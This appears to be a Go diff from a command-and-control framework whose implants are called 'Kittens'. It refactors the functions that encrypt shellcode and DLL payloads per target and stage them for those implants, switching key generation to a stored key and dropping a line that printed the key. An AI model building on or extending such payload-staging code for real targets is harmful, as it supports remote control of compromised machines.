@@ -18,7 +18,7 @@ var Targets map[string]*Kitten
 func HostShellcode(path string, kittenName string) error {
 	task := util.NewTask()
 	var err error
-	key := crypto.GenerateKey(Targets[kittenName].InitChecks.GetHostname(), 32)
+	key := Targets[kittenName].GetKey()
 	sc, err := os.ReadFile(path)
 	if err != nil {
 		return err
@@ -42,10 +42,6 @@ func HostShellcode(path string, kittenName string) error {
 	if err != nil {
 		return err
 	}
-	if err != nil {
-		return err
-	}
-	fmt.Println(color.Green("[+] Key generated is : " + key))
 	Targets[kittenName].SetPayload(shellcode)
 	fmt.Println(color.Green("[+] Shellcode hosted for " + kittenName))
 	return error(nil)
@@ -55,7 +51,7 @@ func HostShellcode(path string, kittenName string) error {
 func HostSleep(t int, kittenName string) error {
 	Targets[kittenName].SetSleep(t)
 	task := util.NewTask()
-	key := crypto.GenerateKey(Targets[kittenName].InitChecks.GetHostname(), 32)
+	key := Targets[kittenName].GetKey()
 	task.SetTag("sleep")
 	task.SetPayload([]byte(fmt.Sprintf("%d", t)))
 	payload, err := json.Marshal(task)
@@ -71,10 +67,11 @@ func HostSleep(t int, kittenName string) error {
 	return error(nil)
 }
 
+// HostDll Hosts the shellcode converted dll
 func HostDll(path, entry, kittenName string) error {
 	task := util.NewTask()
 	var err error
-	key := crypto.GenerateKey(Targets[kittenName].InitChecks.GetHostname(), 32)
+	key := Targets[kittenName].GetKey()
 	dll, err := os.ReadFile(path)
 	if err != nil {
 		return err
@@ -91,7 +88,6 @@ func HostDll(path, entry, kittenName string) error {
 		return err
 	}
 	shellcode, err := crypto.Encrypt(payload, key)
-
 	if err != nil {
 		return err
 	}
